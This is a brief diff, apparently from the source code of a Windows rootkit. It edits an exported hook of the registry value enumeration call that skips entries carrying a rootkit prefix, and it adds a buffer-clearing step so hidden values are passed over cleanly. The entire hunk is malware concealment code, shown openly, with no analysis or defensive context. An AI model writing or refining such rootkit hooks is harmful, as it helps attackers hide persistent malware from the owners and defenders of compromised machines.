@@ -349,7 +349,8 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 		if (name.find(ROOTKIT_PREFIX) == std::wstring::npos)
 			break;
 
-		// else we increase the index and check the next entry
+		// else clear the current held information and increase the index to check next value
+		std::memset(key_value_info, 0, length);
 		++index;
 	}
 
